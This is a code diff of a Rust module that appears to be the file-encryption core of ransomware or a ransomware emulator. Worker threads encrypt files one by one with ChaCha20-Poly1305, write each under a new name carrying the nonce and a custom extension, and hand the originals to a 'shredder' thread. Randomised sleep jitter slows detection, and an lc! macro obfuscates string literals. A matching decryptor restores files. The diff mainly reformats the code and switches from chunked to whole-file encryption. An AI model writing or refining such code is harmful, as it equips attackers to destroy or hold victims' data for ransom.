@@ -1,33 +1,30 @@
 use crossbeam_channel::{Receiver, Sender};
-use hex::{encode, FromHex};
+use hex::{FromHex, encode};
 use log::{debug, error, info, warn};
 use purecrypto::{cipher::ChaCha20Poly1305, rsa::BoxedRsaPublicKey};
 use rand::{
-    rngs::{SmallRng, StdRng},
     RngExt, SeedableRng,
+    rngs::{SmallRng, StdRng},
 };
 use std::{
     fs::{self, File, OpenOptions},
     io::{Error, Read, Write},
     path::PathBuf,
     sync::{
-        atomic::{AtomicU64, Ordering},
         Arc, LazyLock,
+        atomic::{AtomicU64, Ordering},
     },
     thread, time,
 };
 
 use crate::config;
 
-// Bytes 8..12 are left zero here and reserved for `chunk_nonce`, which writes the per-chunk index into them.
 pub fn nonce_from_counter(counter: u64) -> [u8; 12] {
     let mut nonce = [0u8; 12];
     nonce[0..8].copy_from_slice(&counter.to_le_bytes());
     nonce
 }
 
-const BUFFER_LEN: usize = 100 * 1024;
-const MAX_DECRYPT_CHUNK_LEN: usize = 1024 * 1024;
 static ANALYSIS_FILENAME: LazyLock<String> = LazyLock::new(|| lc!("analysis.txt"));
 
 pub fn encrypt(
@@ -38,91 +35,95 @@ pub fn encrypt(
     aad: Arc<[u8]>,
 ) -> thread::JoinHandle<()> {
     debug!("Starting encryption crypto thread");
-    thread::spawn(move || loop {
-        let file_path = match receiver.recv() {
-            Ok(path) => {
-                debug!("Received file path over channel: {path:?}");
-                path
-            }
-            Err(error) => {
-                warn!("Error receiving file path over channel: {error}");
-                return;
-            }
-        };
-
-        let result = std::panic::catch_unwind({
-            let file_path = file_path.clone();
-            let key = Arc::clone(&key);
-            let counter = Arc::clone(&counter);
-            let aad = Arc::clone(&aad);
-            let sender = sender.clone();
-            let mut rng_cheap = SmallRng::from_rng(&mut rand::rng());
-            debug!("Created cheap random number generator");
-            move || {
-                info!("Encrypting file: {file_path:?}");
-
-                let nonce = counter.fetch_add(1, Ordering::Relaxed);
-                debug!("Nonce value after increment: {nonce:?}");
-
-                let full_nonce_bytes = nonce_from_counter(nonce);
-                debug!("Nonce value after padding: {full_nonce_bytes:?}");
-
-                let nonce_file_extension = format!(
-                    "{}.{}",
-                    encode(full_nonce_bytes),
-                    config::ENCRYPTED_EXTENSION.as_str()
-                );
-                debug!("Nonce extension: {nonce_file_extension}");
-
-                let encrypted_file_path = {
-                    let mut path = file_path.as_ref().clone();
-                    let name = path
-                        .file_name()
-                        .map(|n| n.to_string_lossy().into_owned())
-                        .unwrap_or_default();
-                    path.set_file_name(format!("{name}.{nonce_file_extension}"));
+    thread::spawn(move || {
+        loop {
+            let file_path = match receiver.recv() {
+                Ok(path) => {
+                    debug!("Received file path over channel: {path:?}");
                     path
-                };
-                debug!("Encrypted file path: {}", encrypted_file_path.display());
+                }
+                Err(error) => {
+                    warn!("Error receiving file path over channel: {error}");
+                    return;
+                }
+            };
 
-                debug!(
-                    "Applying ChaCha with source {}, destination {}, and nonce {:?} ",
-                    file_path.as_ref().display(),
-                    encrypted_file_path.display(),
-                    full_nonce_bytes
-                );
-                match aead_encrypt_file(
-                    file_path.as_ref(),
-                    &encrypted_file_path,
-                    &key,
-                    &full_nonce_bytes,
-                    &aad,
-                ) {
-                    Ok(()) => {
-                        debug!("Successfully applied ChaCha to data for encryption: {file_path:?}");
-                        if let Err(error) = sender.send(file_path.clone()) {
-                            error!("Failed to send path to shredder thread: {error}");
+            let result = std::panic::catch_unwind({
+                let file_path = file_path.clone();
+                let key = Arc::clone(&key);
+                let counter = Arc::clone(&counter);
+                let aad = Arc::clone(&aad);
+                let sender = sender.clone();
+                let mut rng_cheap = SmallRng::from_rng(&mut rand::rng());
+                debug!("Created cheap random number generator");
+                move || {
+                    info!("Encrypting file: {file_path:?}");
+
+                    let nonce = counter.fetch_add(1, Ordering::Relaxed);
+                    debug!("Nonce value after increment: {nonce:?}");
+
+                    let full_nonce_bytes = nonce_from_counter(nonce);
+                    debug!("Nonce value after padding: {full_nonce_bytes:?}");
+
+                    let nonce_file_extension = format!(
+                        "{}.{}",
+                        encode(full_nonce_bytes),
+                        config::ENCRYPTED_EXTENSION.as_str()
+                    );
+                    debug!("Nonce extension: {nonce_file_extension}");
+
+                    let encrypted_file_path = {
+                        let mut path = file_path.as_ref().clone();
+                        let name = path
+                            .file_name()
+                            .map(|n| n.to_string_lossy().into_owned())
+                            .unwrap_or_default();
+                        path.set_file_name(format!("{name}.{nonce_file_extension}"));
+                        path
+                    };
+                    debug!("Encrypted file path: {}", encrypted_file_path.display());
+
+                    debug!(
+                        "Applying ChaCha with source {}, destination {}, and nonce {:?} ",
+                        file_path.as_ref().display(),
+                        encrypted_file_path.display(),
+                        full_nonce_bytes
+                    );
+                    match aead_encrypt_file(
+                        file_path.as_ref(),
+                        &encrypted_file_path,
+                        &key,
+                        &full_nonce_bytes,
+                        &aad,
+                    ) {
+                        Ok(()) => {
+                            debug!(
+                                "Successfully applied ChaCha to data for encryption: {file_path:?}"
+                            );
+                            if let Err(error) = sender.send(file_path.clone()) {
+                                error!("Failed to send path to shredder thread: {error}");
+                            }
+                        }
+                        Err(error) => {
+                            error!("Failed to apply ChaCha to data for encryption: {error:?}");
                         }
                     }
-                    Err(error) => {
-                        error!("Failed to apply ChaCha to data for encryption: {error:?}");
+
+                    let wait_time = config::WAIT_TIME;
+                    let jitter_time = config::JITTER_TIME;
+                    if wait_time > 0 {
+                        let time = wait_time - jitter_time + rng_cheap.random_range(0..jitter_time);
+                        debug!("Sleeping {time} seconds before next encryption");
+                        let time_duration = time::Duration::from_secs(u64::from(time));
+                        thread::sleep(time_duration);
+                        debug!("Sleeping complete");
                     }
                 }
+            });
 
-                let wait_time = config::WAIT_TIME;
-                let jitter_time = config::JITTER_TIME;
-                if wait_time > 0 {
-                    let time = wait_time - jitter_time + rng_cheap.random_range(0..jitter_time);
-                    debug!("Sleeping {time} seconds before next encryption");
-                    let time_duration = time::Duration::from_secs(u64::from(time));
-                    thread::sleep(time_duration);
-                    debug!("Sleeping complete");
-                }
+            if result.is_err() {
+                error!("Encryption thread recovered from panic on file: {file_path:?}");
             }
-        });
-
-        if result.is_err() {
-            error!("Encryption thread recovered from panic on file: {file_path:?}");
         }
     })
 }
@@ -168,99 +169,95 @@ pub fn decrypt(
     key: Arc<[u8; 32]>,
     aad: Arc<[u8]>,
 ) -> thread::JoinHandle<()> {
-    thread::spawn(move || loop {
-        let file_path = match receiver.recv() {
-            Ok(path) => {
-                debug!("Received file path over channel: {path:?}");
-                path
-            }
-            Err(error) => {
-                warn!("Error receiving file path over channel: {error}");
-                return;
-            }
-        };
+    thread::spawn(move || {
+        loop {
+            let file_path = match receiver.recv() {
+                Ok(path) => {
+                    debug!("Received file path over channel: {path:?}");
+                    path
+                }
+                Err(error) => {
+                    warn!("Error receiving file path over channel: {error}");
+                    return;
+                }
+            };
 
-        info!("Decrypting file: {}", file_path.display());
+            info!("Decrypting file: {}", file_path.display());
 
-        let file_name_osstr = if let Some(os_str) = file_path.file_name() {
-            debug!("Successfully got file name from path: {}", os_str.display());
-            os_str
-        } else {
-            error!("File path has invalid file name: {file_path:?}");
-            continue;
-        };
+            let file_name_osstr = if let Some(os_str) = file_path.file_name() {
+                debug!("Successfully got file name from path: {}", os_str.display());
+                os_str
+            } else {
+                error!("File path has invalid file name: {file_path:?}");
+                continue;
+            };
 
-        let file_name = if let Some(name) = file_name_osstr.to_str() {
-            debug!("Successfully converted file name to string: {name}");
-            name
-        } else {
-            error!(
-                "File name is not valid UTF-8: {}",
-                file_name_osstr.display()
-            );
-            continue;
-        };
+            let file_name = if let Some(name) = file_name_osstr.to_str() {
+                debug!("Successfully converted file name to string: {name}");
+                name
+            } else {
+                error!(
+                    "File name is not valid UTF-8: {}",
+                    file_name_osstr.display()
+                );
+                continue;
+            };
 
-        let file_extensions: Vec<&str> = file_name.split('.').collect();
-        let file_extensions_count = file_extensions.len();
-        if file_extensions_count < 2 {
-            error!("File lacks the number of extensions to decrypt: {file_extensions_count}");
-            continue;
-        }
-
-        let nonce_str = if let Some(segment) = file_extensions.get(file_extensions_count - 2) {
-            debug!("Successfully got nonce file extension: {segment}");
-            segment
-        } else {
-            error!("Cannot get nonce extension: {file_extensions:?}");
-            continue;
-        };
-
-        let full_nonce_bytes = match <[u8; 12]>::from_hex(nonce_str) {
-            Ok(nonce_bytes) => {
-                debug!("Extension hex decoded: {nonce_bytes:?}");
-                nonce_bytes
-            }
-            Err(error) => {
-                error!("Extension hex could not be decoded: {error:?}");
+            let file_extensions: Vec<&str> = file_name.split('.').collect();
+            let file_extensions_count = file_extensions.len();
+            if file_extensions_count < 2 {
+                error!("File lacks the number of extensions to decrypt: {file_extensions_count}");
                 continue;
             }
-        };
 
-        let parent_dir = if let Some(parent) = file_path.parent() {
-            debug!("Successfully got parent path of file path: {file_path:?}");
-            parent
-        } else {
-            error!("File path has invalid parent path: {file_path:?}");
-            continue;
-        };
+            let nonce_str = if let Some(segment) = file_extensions.get(file_extensions_count - 2) {
+                debug!("Successfully got nonce file extension: {segment}");
+                segment
+            } else {
+                error!("Cannot get nonce extension: {file_extensions:?}");
+                continue;
+            };
 
-        let decrypted_file_name = file_extensions[..file_extensions_count - 2].join(".");
-        debug!("Decrypted file name: {decrypted_file_name}");
-        let decrypted_file_path = parent_dir.join(decrypted_file_name);
-        debug!("Decrypted file path: {}", decrypted_file_path.display());
+            let full_nonce_bytes = match <[u8; 12]>::from_hex(nonce_str) {
+                Ok(nonce_bytes) => {
+                    debug!("Extension hex decoded: {nonce_bytes:?}");
+                    nonce_bytes
+                }
+                Err(error) => {
+                    error!("Extension hex could not be decoded: {error:?}");
+                    continue;
+                }
+            };
 
-        match aead_decrypt_file(
-            file_path.as_ref(),
-            &decrypted_file_path,
-            &key,
-            &full_nonce_bytes,
-            &aad,
-        ) {
-            Ok(()) => {
-                debug!("Successfully applied ChaCha to data for decryption: {file_path:?}");
-            }
-            Err(error) => {
-                error!("Failed to apply ChaCha to data for decryption: {error:?}");
+            let parent_dir = if let Some(parent) = file_path.parent() {
+                debug!("Successfully got parent path of file path: {file_path:?}");
+                parent
+            } else {
+                error!("File path has invalid parent path: {file_path:?}");
+                continue;
+            };
+
+            let decrypted_file_name = file_extensions[..file_extensions_count - 2].join(".");
+            debug!("Decrypted file name: {decrypted_file_name}");
+            let decrypted_file_path = parent_dir.join(decrypted_file_name);
+            debug!("Decrypted file path: {}", decrypted_file_path.display());
+
+            match aead_decrypt_file(
+                file_path.as_ref(),
+                &decrypted_file_path,
+                &key,
+                &full_nonce_bytes,
+                &aad,
+            ) {
+                Ok(()) => {
+                    debug!("Successfully applied ChaCha to data for decryption: {file_path:?}");
+                }
+                Err(error) => {
+                    error!("Failed to apply ChaCha to data for decryption: {error:?}");
+                }
             }
         }
     })
-}
-
-fn chunk_nonce(base: &[u8; 12], chunk_index: u32) -> [u8; 12] {
-    let mut nonce = *base;
-    nonce[8..12].copy_from_slice(&chunk_index.to_le_bytes());
-    nonce
 }
 
 fn aead_encrypt_file(
@@ -274,23 +271,11 @@ fn aead_encrypt_file(
         let aead = ChaCha20Poly1305::new(key);
         let mut source = File::open(source_file_path)?;
         let mut dest = File::create(destination_file_path)?;
-        let mut buffer = vec![0u8; BUFFER_LEN];
-        let mut chunk_index: u32 = 0;
-        loop {
-            let read = match source.read(&mut buffer) {
-                Ok(0) => break,
-                Ok(n) => n,
-                Err(error) => return Err(error),
-            };
-            let nonce = chunk_nonce(full_nonce_bytes, chunk_index);
-            let tag = aead.encrypt(&nonce, aad, &mut buffer[..read]);
-            dest.write_all(&u32::try_from(read).map_err(Error::other)?.to_le_bytes())?;
-            dest.write_all(&buffer[..read])?;
-            dest.write_all(&tag)?;
-            chunk_index = chunk_index
-                .checked_add(1)
-                .ok_or_else(|| Error::other("chunk index overflow during encryption"))?;
-        }
+        let mut data = Vec::new();
+        source.read_to_end(&mut data)?;
+        let tag = aead.encrypt(full_nonce_bytes, aad, &mut data);
+        dest.write_all(&data)?;
+        dest.write_all(&tag)?;
         dest.sync_all()?;
         Ok(())
     })();
@@ -310,36 +295,18 @@ fn aead_decrypt_file(
     let aead = ChaCha20Poly1305::new(key);
     let mut source = File::open(source_file_path)?;
     let mut dest = File::create(destination_file_path)?;
-    let mut chunk_index: u32 = 0;
-    loop {
-        let mut len_buf = [0u8; 4];
-        match source.read(&mut len_buf[..1]) {
-            Ok(0) => break,
-            Ok(_) => {}
-            Err(error) => return Err(error),
-        }
-        source.read_exact(&mut len_buf[1..])?;
-        let cipher_len = u32::from_le_bytes(len_buf) as usize;
-        if cipher_len > MAX_DECRYPT_CHUNK_LEN {
-            return Err(Error::other("encrypted chunk length implausible"));
-        }
-        let mut ciphertext = vec![
-            0u8;
-            cipher_len.checked_add(16).ok_or_else(|| {
-                Error::other("encrypted chunk length overflow")
-            })?
-        ];
-        source.read_exact(&mut ciphertext)?;
-        let mut tag = [0u8; 16];
-        tag.copy_from_slice(&ciphertext[cipher_len..]);
-        let nonce = chunk_nonce(full_nonce_bytes, chunk_index);
-        aead.decrypt(&nonce, aad, &mut ciphertext[..cipher_len], &tag)
-            .map_err(|_| Error::other("ChaCha20-Poly1305 authentication failed"))?;
-        dest.write_all(&ciphertext[..cipher_len])?;
-        chunk_index = chunk_index
-            .checked_add(1)
-            .ok_or_else(|| Error::other("chunk index overflow during decryption"))?;
+    let mut data = Vec::new();
+    source.read_to_end(&mut data)?;
+    if data.len() < 16 {
+        return Err(Error::other("Encrypted file shorter than Poly1305 tag"));
     }
+    let cipher_len = data.len() - 16;
+    let mut tag = [0u8; 16];
+    tag.copy_from_slice(&data[cipher_len..]);
+    data.truncate(cipher_len);
+    aead.decrypt(full_nonce_bytes, aad, &mut data, &tag)
+        .map_err(|_| Error::other("ChaCha20-Poly1305 authentication failed"))?;
+    dest.write_all(&data)?;
     dest.sync_all()?;
     Ok(())
 }
